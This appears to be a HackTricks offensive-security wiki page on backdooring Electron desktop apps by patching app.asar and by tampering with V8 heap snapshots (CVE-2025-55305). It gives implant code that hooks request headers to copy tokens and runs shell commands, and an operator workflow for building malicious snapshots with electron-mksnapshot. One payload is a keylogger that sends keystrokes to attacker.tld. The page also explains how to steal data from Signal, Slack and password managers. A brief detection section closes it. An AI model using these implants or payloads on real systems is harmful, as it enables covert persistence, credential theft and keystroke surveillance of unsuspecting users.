# Electron Local Code Injection and Snapshot Tampering

{{#include ../../banners/hacktricks-training.md}}

## Electron Local Code Injection

If you can modify or instrument a locally installed Electron application, you may be able to make it execute arbitrary JavaScript. See:


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

For a local Node inspector or Chromium DevTools debugging surface, see [Node inspector/CEF debug abuse](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

## Post-exploitation: ASAR/main-process implants

If you obtain **write access** to an Electron app resources directory, a very practical post-exploitation primitive is to **patch `app.asar`** (or the JS entrypoint it loads) and wait for the user to relaunch the app. Unlike a renderer-only XSS, code loaded from the **main process** executes in the app's **Node.js runtime**, so it can usually access the **filesystem**, spawn commands, hook Electron APIs, and inspect authenticated application state.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Typical workflow:

1. Extract `app.asar` and identify the real bootstrap file from `package.json` (`main`) or the existing startup logic.
2. Add a small loader in the **main process** (or a preload/main-process hook) and repack the archive.
3. Wait for the application to start again and use the implant to capture runtime data after the user unlocks or authenticates to the desktop app.

Minimal bootstrap patch example:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

Practical implications:

- **Trusted-client data theft**: once the desktop app decrypts or loads data for the user, the implant can read it from the runtime. This is why **E2EE messaging clients** (Signal/Slack/Mattermost) and **vault/secret managers** are still interesting targets at the endpoint layer.
- **Session/token abuse**: Electron implants can steal app cookies, bearer tokens, request headers, workspace files, or repo credentials exposed to the running client (for example, authenticated VS Code extensions or Git integrations).
- **Victim-context pivoting**: a patched app can proxy requests through the victim workstation, reusing the victim IP, TLS fingerprint, and application session instead of only exfiltrating raw tokens.

> [!NOTE]
> If the target enables **ASAR integrity** / **OnlyLoadAppFromAsar** or hardened Electron **fuses**, you may need a different local code-loading primitive (for example, fuse abuse or snapshot tampering). See the macOS-specific injection page for more local implant options and fuse details.

## Local backdooring via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Electron and Chromium-based apps deserialize a prebuilt V8 heap snapshot at startup (v8_context_snapshot.bin, and optionally browser_v8_context_snapshot.bin) to initialize each V8 isolate (main, preload, renderer). Historically, Electron’s integrity fuses did not treat these snapshots as executable content, so they escaped both fuse-based integrity enforcement and OS code-signing checks. As a result, replacing the snapshot in a user-writable installation provided stealthy, persistent code execution inside the app without modifying the signed binaries or ASAR.<sup>[[2]](#references)</sup>

Key points
- Integrity gap: EnableEmbeddedAsarIntegrityValidation and OnlyLoadAppFromAsar validate app JavaScript inside the ASAR, but they did not cover V8 heap snapshots (CVE-2025-55305). Chromium similarly does not integrity-check snapshots.<sup>[[3]](#references)[[4]](#references)</sup>
- Attack preconditions: Local file write into the app’s installation directory. This is common on systems where Electron apps or Chromium browsers are installed under user-writable paths (e.g., %AppData%\Local on Windows; /Applications with caveats on macOS).
- Effect: Reliable execution of attacker JavaScript in any isolate by clobbering a frequently used builtin (a “gadget”), enabling persistence and evasion of code-signing verification.
- Affected surface: Electron apps (even with fuses enabled) and Chromium-based browsers that load snapshots from user-writable locations.

Generating a malicious snapshot without building Chromium
- Use the prebuilt electron/mksnapshot to compile a payload JS into a snapshot and overwrite the application’s v8_context_snapshot.bin.<sup>[[5]](#references)[[6]](#references)</sup>

Example minimal payload (prove execution by forcing a crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Isolate-aware payload routing (run different code in main vs. renderer)
- Main process detection: Node-only globals like process.pid, process.binding(), or process.dlopen are present in the main process isolate.
- Browser/renderer detection: Browser-only globals like alert are available when running in a document context.

Example gadget that probes main-process Node capabilities once
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

Renderer/browser-context data theft PoC (e.g., Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Operator workflow
1) Write payload.js that clobbers a common builtin (e.g., Array.isArray) and optionally branches per isolate.
2) Build the snapshot without Chromium sources:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Overwrite the target application’s snapshot file(s):
   - v8_context_snapshot.bin (always used)
   - browser_v8_context_snapshot.bin (if the LoadBrowserProcessSpecificV8Snapshot fuse is used)
4) Launch the application; the gadget executes whenever the chosen builtin is used.

Notes and considerations
- Integrity/signature bypass: Snapshot files are not treated as native executables by code-signing checks and (historically) were not covered by Electron’s fuses or Chromium integrity controls.
- Persistence: Replacing the snapshot in a user-writable install typically survives app restarts and looks like a signed, legitimate app.
- Chromium browsers: The same tampering concept applies to Chrome/derivatives installed in user-writable locations. Chrome has other integrity mitigations but explicitly excludes physically local attacks from its threat model.<sup>[[9]](#references)[[10]](#references)</sup>

Detection and mitigations
- Treat snapshots as executable content and include them in integrity enforcement (CVE-2025-55305 fix).
- Prefer admin-writable-only install locations; baseline and monitor hashes for v8_context_snapshot.bin and browser_v8_context_snapshot.bin.
- Detect early-runtime builtin clobbering and unexpected snapshot changes; alert when deserialized snapshots do not match expected values.

## References

- [1] [JS-Tap v3: Endpoint Post-Exploitation With JavaScript Implants](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)

{{#include ../../banners/hacktricks-training.md}}
